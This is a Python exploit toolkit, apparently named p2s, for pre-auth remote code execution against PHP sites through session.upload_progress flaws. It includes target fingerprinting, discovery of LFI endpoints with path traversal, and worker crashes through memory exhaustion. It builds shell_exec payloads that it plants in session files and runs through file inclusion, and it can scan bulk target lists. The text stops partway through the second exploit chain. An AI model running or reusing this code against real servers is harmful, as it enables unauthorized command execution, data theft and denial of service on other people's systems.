#!/usr/bin/env python3
"""
p2s — php2shell unified scanner + exploit
CVE-2026-109618 / CVE-2026-109619 / CVE-2026-115560

All-scenario pre-auth RCE toolkit for PHP session.upload_progress vulns.
Covers: mod_php heap, session-file-injection + LFI, race-condition LFI,
handler-mismatch deserialization, FPM heap w/ offset profiles, and the
CVE-2026-115560 serialize_handler runtime-switch variant.

Usage:
  p2s.py https://target.com/                          # auto-detect + assess
  p2s.py https://target.com/ --deep                   # OOM + stale state probe
  p2s.py https://target.com/ --rce                    # attempt all RCE chains
  p2s.py https://target.com/ --rce -c 'id'            # custom command
  p2s.py https://target.com/ --rce --chain sfi        # force a specific chain
  p2s.py -f targets.txt -o results.jsonl              # bulk scan
  p2s.py -f targets.txt -o results.jsonl --workers 10 # parallel bulk
  p2s.py --version 8.3.12                             # offline version check
  p2s.py --proxy http://127.0.0.1:8080 URL            # route through Burp

Requires: Python 3.8+ (stdlib only, zero dependencies)
"""

import argparse
import concurrent.futures
import hashlib
import json
import os
import re
import secrets
import socket
import ssl
import struct
import sys
import threading
import time
from urllib.parse import urlparse, quote

__version__ = "2.0.0"

# Force UTF-8 on Windows terminals (cp1252 can't render box-drawing chars)
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Config
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

UA = "Mozilla/5.0 (compatible; security-assessment)"

# Upstream fix lines per branch
FIXED = {
    (8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12,
}

# CVE-2026-115560 fix lines (TBD — not yet released as of 2026-10-24)
FIXED_115560 = {}  # will be populated when PHP publishes the fix

# Common session save paths (Linux + Windows)
SESSION_DIRS = [
    "/tmp", "/tmp/sessions",
    "/var/lib/php/sessions", "/var/lib/php/session",
    "/var/lib/php8/sessions", "/var/lib/php7/sessions",
    "/var/lib/php5/sessions",
    "C:/xampp/tmp", "C:/wamp/tmp", "C:/wamp64/tmp",
    "C:/Windows/Temp", "C:/php/tmp", "C:/inetpub/temp",
]

# Common LFI endpoints and parameters
LFI_ENDPOINTS = [
    "/index.php", "/page.php", "/view.php", "/include.php", "/load.php",
    "/template.php", "/file.php", "/read.php", "/show.php", "/home.php",
    "/main.php", "/content.php", "/portal.php", "/app.php", "/common.php",
    "/test.php",
]
LFI_PARAMS = [
    "page", "file", "path", "include", "view", "load", "template",
    "content", "doc", "p", "f", "source", "lang", "module", "q",
    "action", "dir", "layout", "mod", "sect",
]

# phpinfo probe paths
PHPINFO_PATHS = [
    "/info.php", "/phpinfo.php", "/pi.php", "/i.php",
    "/_phpinfo.php", "/php_info.php", "/test.php",
    "/debug.php", "/server-info.php",
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HTTP transport (raw sockets — handles crashes, proxy-capable)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _connect(host, port, tls, timeout=15, proxy=None):
    """Open a socket, optionally through an HTTP CONNECT proxy."""
    if proxy:
        pu = urlparse(proxy)
        ph, pp = pu.hostname, pu.port or 8080
        sock = socket.create_connection((ph, pp), timeout=timeout)
        if tls:
            connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
            sock.sendall(connect_req.encode())
            resp = b""
            while b"\r\n\r\n" not in resp:
                d = sock.recv(4096)
                if not d:
                    break
                resp += d
            if b"200" not in resp.split(b"\r\n")[0]:
                sock.close()
                raise ConnectionError(f"CONNECT proxy returned: {resp[:80]}")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    sock = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _send_recv(host, port, tls, method, path, headers, body=None,
               timeout=15, proxy=None):
    """Raw HTTP request. Returns (status, resp_headers_dict, body_bytes).
    status=-1 on crash/reset/timeout."""
    hdr_lines = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
    for k, v in headers.items():
        hdr_lines += f"{k}: {v}\r\n"
    if body is not None:
        hdr_lines += f"Content-Length: {len(body)}\r\n"
    hdr_lines += "Connection: close\r\n\r\n"

    try:
        sock = _connect(host, port, tls, timeout, proxy)
    except Exception:
        return -1, {}, b""

    try:
        sock.sendall(hdr_lines.encode())
        if body:
            # Send in chunks to handle large bodies
            mv = memoryview(body)
            for off in range(0, len(body), 65536):
                sock.sendall(bytes(mv[off:off + 65536]))
    except (BrokenPipeError, ConnectionResetError, OSError):
        try:
            sock.close()
        except OSError:
            pass
        return -1, {}, b"rst_send"

    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            data += d
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            break
    try:
        sock.close()
    except OSError:
        pass

    if not data:
        return -1, {}, b"rst_recv"

    try:
        head, resp_body = data.split(b"\r\n\r\n", 1)
    except ValueError:
        return -1, {}, data

    lines = head.split(b"\r\n")
    try:
        status = int(lines[0].split(b" ", 2)[1])
    except (IndexError, ValueError):
        status = -1

    rh = {}
    for ln in lines[1:]:
        if b":" in ln:
            k, v = ln.split(b":", 1)
            key = k.strip().lower().decode()
            val = v.strip().decode()
            if key == "set-cookie" and key in rh:
                rh[key] += ", " + val
            else:
                rh[key] = val
    return status, rh, resp_body


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Version classification
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify(ver_str):
    """Classify a PHP version string. Returns (version, status)."""
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", str(ver_str))
    if not m:
        return None, "parse_error"
    maj, mino, pat = int(m.group(1)), int(m.group(2)), int(m.group(3))

    # Check for prerelease suffixes
    full = str(ver_str).strip()
    if re.search(r'(?:alpha|beta|rc|dev)\d*', full, re.I):
        return f"{maj}.{mino}.{pat}", "PRERELEASE"

    key = (maj, mino)
    if key in FIXED:
        return f"{maj}.{mino}.{pat}", "VULN" if pat < FIXED[key] else "SAFE"
    # EOL branches (still affected, no official fix)
    if key <= (8, 1) and key >= (5, 4):
        return f"{maj}.{mino}.{pat}", "EOL"
    if key < (5, 4):
        return f"{maj}.{mino}.{pat}", "ANCIENT"
    return f"{maj}.{mino}.{pat}", "UNKNOWN"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Multipart builders
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _mp_session_inject(boundary, sess_name, sid, prog_name, filename,
                       file_data=b"X"):
    """Standard upload_progress multipart with controlled filename.
    The filename is stored RAW in the session file — can contain PHP code."""
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{sess_name}"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{prog_name}"\r\n\r\nprobe\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("latin-1") + file_data + f"\r\n--{boundary}--\r\n".encode()


def _mp_oom_spray(boundary, sess_name, sid, prog_name, filename,
                  n_fields, field_size):
    """Session injection + OOM fields to prevent cleanup.
    Non-file form fields after the file part: values live in $_POST zend memory
    (~4x overhead). File content goes to disk (no OOM). The file triggers the
    progress callback that writes the session. OOM during form-field processing
    prevents session.upload_progress.cleanup → poisoned session persists."""
    out = bytearray()
    out += (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{sess_name}"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{prog_name}"\r\n\r\nprobe\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nX\r\n"
    ).encode("latin-1")
    pad = b"Z" * field_size
    for i in range(n_fields):
        out += (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="p{i}"\r\n\r\n'
        ).encode()
        out += pad + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return bytes(out)


def _mp_amplified(boundary, sess_name, sid, prog_name, num_parts, pad):
    """Many small file parts → callback allocation amplification (OOM trigger)."""
    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{sess_name}"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{prog_name}"\r\n\r\nprobe\r\n'
    ).encode()
    pad_bytes = b"D" * max(1, pad)
    parts = bytearray()
    for n in range(num_parts):
        parts += (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{n}"; filename="f{n}.b"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        parts += pad_bytes + b"\r\n"
    return header + bytes(parts) + f"--{boundary}--\r\n".encode()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _parse_mem(s):
    """Parse PHP memory_limit string to bytes."""
    s = str(s).strip().upper()
    if s == "-1":
        return -1
    for suffix, mult in [("G", 1024**3), ("M", 1024**2), ("K", 1024)]:
        if s.endswith(suffix):
            try:
                return int(s[:-1]) * mult
            except ValueError:
                return None
    try:
        return int(s)
    except ValueError:
        return None


def _calc_oom(mem_bytes, max_body):
    """Calculate OOM spray parameters: n_fields × field_size.
    Uses non-file form fields whose VALUE stays in $_POST zend memory (~4x overhead)."""
    target = max(mem_bytes * 2, 2 * 1024 * 1024) if mem_bytes > 0 else 16 * 1024 * 1024
    target = min(target, int(max_body * 0.9))
    n_fields = 30
    field_size = max(1000, target // n_fields)
    return n_fields, field_size


def _escape_php_cmd(cmd):
    """Escape a command for safe embedding in a PHP single-quoted string."""
    return cmd.replace("\\", "\\\\").replace("'", "\\'")


def _php_payload(cmd, marker):
    """Build a PHP payload with output markers. Uses base64 to avoid
    quote-escaping issues in Content-Disposition filename."""
    b64 = __import__("base64").b64encode(cmd.encode()).decode()
    s_tag = f"P2S_{marker}_S"
    e_tag = f"P2S_{marker}_E"
    return (
        f"<?php echo '{s_tag}';"
        f"echo shell_exec(base64_decode('{b64}'));"
        f"echo '{e_tag}'; ?>"
    ), s_tag, e_tag


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 1: Fingerprint (runs on every target, fast, mostly passive)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fingerprint(url, proxy=None):
    """Returns dict with target info: PHP version, SAPI, config, surface."""
    u = urlparse(url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    tls = u.scheme == "https"
    path = u.path or "/"

    info = {
        "url": url, "host": host, "port": port, "tls": tls, "path": path,
        "proxy": proxy,
        "php": None, "status": "UNKNOWN", "sapi": "unknown",
        "server": "", "os_hint": "linux",
        "memory_limit": None, "memory_limit_bytes": None,
        "upload_progress": None,
        "session_name": "PHPSESSID",
        "progress_name": "PHP_SESSION_UPLOAD_PROGRESS",
        "save_path": None, "display_errors": None,
        "use_only_cookies": None, "use_strict_mode": None,
        "serialize_handler": None,
        "is_php": False, "phpinfo_exposed": False,
        "wp_version": None, "cms": None,
        "max_body": None,
        "lfi_endpoint": None, "lfi_param": None,
        "handler_mismatch_dirs": [],
        "user_ini_paths": [],
    }

    # ── Main page headers ──
    s, h, b = _send_recv(host, port, tls, "GET", path,
                         {"User-Agent": UA}, proxy=proxy)
    info["server"] = h.get("server", "")
    xpb = h.get("x-powered-by", "")
    if "php" in xpb.lower():
        m = re.search(r"PHP/(\d+\.\d+\.\d+\S*)", xpb, re.I)
        if m:
            info["php"] = m.group(1)
            info["is_php"] = True

    # OS hint from Server header
    srv_lower = info["server"].lower()
    if any(x in srv_lower for x in ("microsoft", "iis", "win")):
        info["os_hint"] = "windows"

    # SAPI hint from Server header
    if "apache" in srv_lower:
        info["sapi"] = "mod_php" if "mod_php" in xpb.lower() else "likely_mod_php"
    elif any(x in srv_lower for x in ("nginx", "openresty")):
        info["sapi"] = "fpm"
    elif "litespeed" in srv_lower:
        info["sapi"] = "litespeed"
    elif "caddy" in srv_lower:
        info["sapi"] = "fpm"

    # ── PHP presence + CMS heuristics ──
    body_text = b.decode("latin-1", "replace")[:8192] if b else ""
    php_signals = 0

    if "wp-content" in body_text or "wp-includes" in body_text:
        php_signals += 2
        info["is_php"] = True
        info["cms"] = "wordpress"
        wm = re.search(
            r'<meta\s+name=["\']generator["\']\s+content=["\']WordPress\s+([\d.]+)',
            body_text, re.I)
        if wm:
            info["wp_version"] = wm.group(1)
    if "drupal" in body_text.lower() or "sites/default" in body_text:
        info["cms"] = "drupal"
        php_signals += 2
        info["is_php"] = True
    if "joomla" in body_text.lower() or "/administrator/" in body_text:
        info["cms"] = "joomla"
        php_signals += 2
        info["is_php"] = True

    for cookie in h.get("set-cookie", "").split(","):
        if "PHPSESSID" in cookie.upper():
            php_signals += 2
            info["is_php"] = True

    # ── Probe phpinfo (version + config extraction) ──
    for ppath in PHPINFO_PATHS:
        s2, h2, b2 = _send_recv(host, port, tls, "GET", ppath,
                                 {"User-Agent": UA}, proxy=proxy)
        if s2 == 200 and b2:
            ptxt = b2.decode("latin-1", "replace")
            if "<title>phpinfo()" in ptxt or "PHP Version" in ptxt:
                info["phpinfo_exposed"] = True
                vm = re.search(r"PHP Version\s+(\d+\.\d+\.\d+\S*)", ptxt)
                if vm:
                    info["php"] = vm.group(1)
                    info["is_php"] = True

                # Extract all config values we care about
                config_patterns = {
                    "session_name": r"session\.name</td><td[^>]*>(\w+)",
                    "progress_name": r"session\.upload_progress\.name</td><td[^>]*>(\w+)",
                    "memory_limit": r"memory_limit</td><td[^>]*>(-?\d+\w?)",
                    "save_path": r"session\.save_path</td><td[^>]*>([^<]+)",
                    "serialize_handler": r"session\.serialize_handler</td><td[^>]*>(\w+)",
                }
                for key, pat in config_patterns.items():
                    fm = re.search(pat, ptxt, re.DOTALL | re.I)
                    if fm:
                        val = fm.group(1).strip()
                        if val and val.lower() != "no value":
                            info[key] = val

                # Boolean config flags
                for flag, key in [
                    ("session.upload_progress.enabled", "upload_progress"),
                    ("display_errors", "display_errors"),
                    ("session.use_only_cookies", "use_only_cookies"),
                    ("session.use_strict_mode", "use_strict_mode"),
                ]:
                    fm = re.search(
                        rf"{re.escape(flag)}</td><td[^>]*>(On|Off|1|0)",
                        ptxt, re.DOTALL | re.I)
                    if fm:
                        info[key] = fm.group(1).lower() in ("on", "1")

                # SAPI from phpinfo
                sm = re.search(r"Server API</td><td[^>]*>([^<]+)", ptxt, re.DOTALL)
                if sm:
                    sapi_str = sm.group(1).strip()
                    if "FPM" in sapi_str:
                        info["sapi"] = "fpm"
                    elif "Apache" in sapi_str and "Handler" in sapi_str:
                        info["sapi"] = "mod_php"
                    elif "LiteSpeed" in sapi_str:
                        info["sapi"] = "litespeed"
                    elif "CGI" in sapi_str:
                        info["sapi"] = "cgi"
                break  # Found phpinfo, stop probing

    # ── Common PHP paths for version/PHP detection ──
    if not info["php"]:
        for ppath in ["/index.php", "/wp-login.php"]:
            s2, h2, _ = _send_recv(host, port, tls, "GET", ppath,
                                   {"User-Agent": UA}, proxy=proxy)
            if s2 in (200, 301, 302):
                php_signals += 1
                xp2 = h2.get("x-powered-by", "")
                vm = re.search(r"PHP/(\d+\.\d+\.\d+\S*)", xp2, re.I)
                if vm:
                    info["php"] = vm.group(1)
                    info["is_php"] = True
                    break

    if php_signals >= 2:
        info["is_php"] = True

    # Parse memory_limit
    if info["memory_limit"]:
        info["memory_limit_bytes"] = _parse_mem(info["memory_limit"])

    # Classify version
    if info["php"]:
        _, info["status"] = classify(info["php"])

    # Default save_path by OS
    if not info["save_path"]:
        info["save_path"] = "C:/xampp/tmp" if info["os_hint"] == "windows" else "/tmp"

    return info


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 1b: Active surface discovery (opt-in, part of --deep or --rce)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def discover_surface(info):
    """Discover LFI endpoints, body size limits, .user.ini files.
    Active probing — sends real requests."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    proxy = info.get("proxy")
    result = {"lfi_found": False, "max_body": None, "user_ini_found": []}

    # ── Body size limit (quick: just 2 probes) ──
    bnd = "----sztest" + secrets.token_hex(4)
    for sz in [2*1024*1024, 20*1024*1024]:
        hdr = (f"--{bnd}\r\nContent-Disposition: form-data; "
               f'name="f"; filename="f"\r\n'
               f"Content-Type: application/octet-stream\r\n\r\n").encode()
        body = hdr + b"A" * sz + f"\r\n--{bnd}--\r\n".encode()
        s, _, _ = _send_recv(host, port, tls, "POST", path,
                             {"User-Agent": UA,
                              "Content-Type": f"multipart/form-data; boundary={bnd}"},
                             body, timeout=30, proxy=proxy)
        if s == 413 or s == -1:
            result["max_body"] = sz
            break
    if not result["max_body"]:
        result["max_body"] = 50 * 1024 * 1024
    info["max_body"] = result["max_body"]

    # ── LFI endpoint discovery ──
    marker = secrets.token_hex(4)
    sid = f"p2s{marker}"
    filename = f"p2slfiscan_{marker}"
    bnd2 = "----lfiscan" + secrets.token_hex(4)
    inject_body = _mp_session_inject(bnd2, info["session_name"], sid,
                                     info["progress_name"], filename)
    _send_recv(host, port, tls, "POST", path,
               {"User-Agent": UA,
                "Content-Type": f"multipart/form-data; boundary={bnd2}",
                "Cookie": f"{info['session_name']}={sid}"},
               inject_body, timeout=15, proxy=proxy)

    # Prioritized LFI scan — top params × top endpoints × top paths
    save_paths = list(dict.fromkeys(filter(None, [
        info.get("save_path")] + SESSION_DIRS[:4])))
    top_params = LFI_PARAMS[:8]
    top_eps = LFI_ENDPOINTS[:8]
    for ep in top_eps:
        for param in top_params:
            for sp in save_paths:
                sf = f"{sp}/sess_{sid}"
                for trav in [sf, "../" * 6 + sf.lstrip("/")]:
                    test_path = f"{ep}?{param}={trav}"
                    s2, _, b2 = _send_recv(host, port, tls, "GET", test_path,
                                           {"User-Agent": UA}, timeout=5,
                                           proxy=proxy)
                    if b2 and filename.encode() in b2:
                        info["lfi_endpoint"] = ep
                        info["lfi_param"] = param
                        result["lfi_found"] = True
                        break
                if result["lfi_found"]:
                    break
            if result["lfi_found"]:
                break
        if result["lfi_found"]:
            break

    # ── .user.ini exposure check ──
    for upath in ["/.user.ini", "/app/.user.ini", "/api/.user.ini",
                  "/public/.user.ini", "/web/.user.ini"]:
        s3, _, b3 = _send_recv(host, port, tls, "GET", upath,
                               {"User-Agent": UA}, timeout=8, proxy=proxy)
        if s3 == 200 and b3:
            txt = b3.decode("latin-1", "replace")
            if "session" in txt.lower() or "serialize" in txt.lower():
                result["user_ini_found"].append(upath)
                # Check for handler mismatch signal
                hm = re.search(r"session\.serialize_handler\s*=\s*(\w+)", txt)
                if hm:
                    info["handler_mismatch_dirs"].append(
                        {"path": upath, "handler": hm.group(1)})

    info["user_ini_paths"] = result["user_ini_found"]
    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 2: Session fixation check (non-destructive behavioral probe)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_session_fixation(info):
    """Test if session fixation via POST body works (bypasses use_only_cookies).
    Safe: filename is plain text, no PHP payload."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    proxy = info.get("proxy")
    sid = f"p2sfix{secrets.token_hex(10)}"
    bnd = "----fixtest" + secrets.token_hex(4)

    body = _mp_session_inject(bnd, info["session_name"], sid,
                              info["progress_name"], "probe.txt")
    # Send SID only in POST body, NOT in Cookie header
    s, h, _ = _send_recv(host, port, tls, "POST", path,
                         {"User-Agent": UA,
                          "Content-Type": f"multipart/form-data; boundary={bnd}"},
                         body, timeout=15, proxy=proxy)

    sc = h.get("set-cookie", "")
    # If Set-Cookie echoes our SID, fixation works
    fixation = sid in sc
    return {"fixation": fixation, "set_cookie": sc[:120], "status": s}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 3: Deep probe (OOM crash + stale state — potentially disruptive)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def deep_probe(info):
    """OOM crash the worker, probe for stale state / memory disclosure."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    proxy = info.get("proxy")
    sn, pn = info["session_name"], info["progress_name"]
    bnd = "----p2s" + secrets.token_hex(4)

    mem = info.get("memory_limit_bytes") or 128 * 1024**2
    max_body = info.get("max_body") or 50 * 1024**2
    sprays = 3

    result = {
        "oom_crashes": 0, "sprays": sprays,
        "stale_sids": [], "memory_leak_sids": [],
        "anomalies": [], "oom_reachable": True,
    }

    # OOM strategy: non-file form fields stay in $_POST zend memory.
    # Target ~15MB of form fields (fits in upload limit, likely exceeds
    # memory_limit after PHP's 4-10x overhead on zend_string alloc).
    n_fields = 30
    field_size = min(500000, max(100000, max_body // 40))
    if True:
        for i in range(sprays):
            sid = f"p2s{secrets.token_hex(10)}"
            body = _mp_oom_spray(bnd, sn, sid, pn, "probe.bin",
                                 n_fields, field_size)
            t0 = time.monotonic()
            s, h, _ = _send_recv(host, port, tls, "POST", path,
                                 {"User-Agent": UA,
                                  "Content-Type": f"multipart/form-data; boundary={bnd}",
                                  "Cookie": f"{sn}={sid}"},
                                 body, timeout=60, proxy=proxy)
            dt = time.monotonic() - t0
            if s in (-1, 502) or (s == 200 and dt < 2):
                result["oom_crashes"] += 1
            time.sleep(0.5)

    # Probe for stale state + memory leak via PHPSESSID cookie
    if result["oom_crashes"] > 0:
        for i in range(20):
            probe_sid = f"prb{secrets.token_hex(10)}"
            s, h, b = _send_recv(host, port, tls, "GET", path,
                                 {"User-Agent": UA,
                                  "Cookie": f"{sn}={probe_sid}"},
                                 timeout=10, proxy=proxy)
            sc = h.get("set-cookie", "")
            if sc and sn.upper() in sc.upper():
                m = re.search(rf"{sn}=([^;]+)", sc, re.I)
                if m:
                    returned_sid = m.group(1)
                    if returned_sid != probe_sid:
                        result["stale_sids"].append(returned_sid[:32])
                    # Memory leak: unusually long/binary SID
                    if len(returned_sid) > 32 or any(
                            ord(c) > 127 for c in returned_sid):
                        result["memory_leak_sids"].append(returned_sid[:64])
            if s == 500:
                result["anomalies"].append(f"probe_{i}_500")
            body_txt = (b.decode("latin-1", "replace")[:2000]) if b else ""
            if "session" in body_txt.lower() and "error" in body_txt.lower():
                result["anomalies"].append(f"probe_{i}_session_error")
            if "memory" in body_txt.lower() and "exhausted" in body_txt.lower():
                result["anomalies"].append(f"probe_{i}_oom_error")

    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 4: RCE — multi-strategy exploit chains
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#
# Chain A: Session File Injection + LFI (bahartanir chain_a)
#   1. POST multipart with PHP code in filename field
#   2. upload_progress callback writes filename raw into session file
#   3. LFI includes the session file → PHP executes injected code
#   Needs: upload_progress=On + an LFI sink on the target
#   Reliability: 100% when LFI exists
#
# Chain B: Session File Injection + OOM persistence + LFI (p2s original)
#   Like Chain A but adds OOM to prevent cleanup (for targets where
#   session.upload_progress.cleanup=On and the session would be deleted)
#   Needs: upload_progress=On + LFI + body big enough for OOM
#
# Chain C: Race condition SFI (when OOM unreachable)
#   Slow-drip upload keeps the poisoned session alive while rapid
#   LFI trigger requests try to include it before cleanup
#   Needs: upload_progress=On + LFI + timing
#
# Chain D: mod_php heap exploitation (godylockz original)
#   OOM → longjmp skips cleanup → UAF → heap spray → RCE
#   Needs: mod_php + display_errors=On + low memory_limit + profile
#   Delegates to php2shell.py
#
# Chain E: Handler mismatch deserialization (bahartanir chain_c)
#   1. Write session via php_serialize directory (filename has |O:...)
#   2. Read session via php directory → deserializer splits at |
#   3. __destruct fires on injected object → POP gadget → RCE
#   Needs: two directories with different serialize_handlers
#
# Chain F: FPM heap with offset profiles (php2shell_fpm.py)
#   OOM + stale state + heap shaping → controlled overwrite → RCE
#   Needs: FPM + per-build offset profile
#   Delegates to php2shell_fpm.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _rce_sfi_direct(info, command):
    """Chain A: Direct session file injection + LFI.
    No OOM needed — works when cleanup doesn't run or is slow."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    proxy = info.get("proxy")
    sn, pn = info["session_name"], info["progress_name"]
    out = {"name": "sfi_direct", "success": False, "detail": "", "output": ""}

    lfi_ep = info.get("lfi_endpoint")
    lfi_p = info.get("lfi_param")
    if not lfi_ep or not lfi_p:
        out["detail"] = "No LFI endpoint found — run with --deep to discover"
        return out

    mk = secrets.token_hex(6)
    sid = f"p2s{secrets.token_hex(12)}"
    php_fn, s_tag, e_tag = _php_payload(command, mk)

    bnd = "----sfi" + secrets.token_hex(4)
    body = _mp_session_inject(bnd, sn, sid, pn, php_fn)

    # Inject session — send SID in both body and cookie for reliability
    _send_recv(host, port, tls, "POST", path,
               {"User-Agent": UA,
                "Content-Type": f"multipart/form-data; boundary={bnd}",
                "Cookie": f"{sn}={sid}"},
               body, timeout=15, proxy=proxy)

    time.sleep(0.3)

    # Trigger LFI to include the session file
    save_paths = list(dict.fromkeys(filter(None, [
        info.get("save_path")] + SESSION_DIRS)))

    for sp in save_paths:
        sf = f"{sp}/sess_{sid}"
        for trav in [sf] + [("../" * d + sf.lstrip("/")) for d in range(3, 10)]:
            test_url = f"{lfi_ep}?{lfi_p}={trav}"
            s2, _, b2 = _send_recv(host, port, tls, "GET", test_url,
                                   {"User-Agent": UA}, timeout=10, proxy=proxy)
            bt = b2.decode("latin-1", "replace") if b2 else ""
            if s_tag in bt:
                out["success"] = True
                out["output"] = bt.split(s_tag, 1)[1].split(e_tag, 1)[0].strip()
                out["detail"] = f"SFI via ?{lfi_p}= → {sf}"
                out["method"] = "sfi_direct"
                return out

    out["detail"] = f"Session planted (sess_{sid}), no LFI hit in {len(save_paths)} paths"
    out["planted_sid"] = sid
    return out


def _rce_sfi_oom(info, command):
    """Chain B: Session file injection + OOM persistence + LFI.
    OOM prevents session cleanup so the poisoned file persists."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    proxy = info.get("proxy")
    sn, pn = info["session_name"], info["progress_name"]
    mem = info.get("memory_limit_bytes") or 128 * 1024**2
    maxb = info.get("max_body") or 50 * 1024**2
    out = {"name": "sfi_oom", "success": False, "detail": "", "output": ""}

    lfi_ep = info.get("lfi_endpoint")
    lfi_p = info.get("lfi_param")
    if not lfi_ep or not lfi_p:
        out["detail"] = "No LFI endpoint — Chain B needs LFI"
        return out

    oom_ok = (maxb > mem) if (mem > 0 and mem != -1) else (maxb > 8 * 1024**2)
    if not oom_ok:
        out["detail"] = (f"OOM unreachable: body ~{maxb//1024//1024}MB vs "
                         f"memory_limit {mem//1024//1024 if mem > 0 else 'unlimited'}MB")
        return out

    n_fields, field_size = _calc_oom(mem, maxb)
    mk = secrets.token_hex(6)
    sid = f"p2s{secrets.token_hex(12)}"
    php_fn, s_tag, e_tag = _php_payload(command, mk)

    bnd = "----sfioom" + secrets.token_hex(4)
    body = _mp_oom_spray(bnd, sn, sid, pn, php_fn, n_fields, field_size)

    _send_recv(host, port, tls, "POST", path,
               {"User-Agent": UA,
                "Content-Type": f"multipart/form-data; boundary={bnd}",
                "Cookie": f"{sn}={sid}"},
               body, timeout=60, proxy=proxy)

    time.sleep(0.5)

    save_paths = list(dict.fromkeys(filter(None, [
        info.get("save_path")] + SESSION_DIRS)))

    for sp in save_paths:
        sf = f"{sp}/sess_{sid}"
        for trav in [sf] + [("../" * d + sf.lstrip("/")) for d in range(3, 12)]:
            test_url = f"{lfi_ep}?{lfi_p}={trav}"
            s2, _, b2 = _send_recv(host, port, tls, "GET", test_url,
                                   {"User-Agent": UA}, timeout=10, proxy=proxy)
            bt = b2.decode("latin-1", "replace") if b2 else ""
            if s_tag in bt:
                out["success"] = True
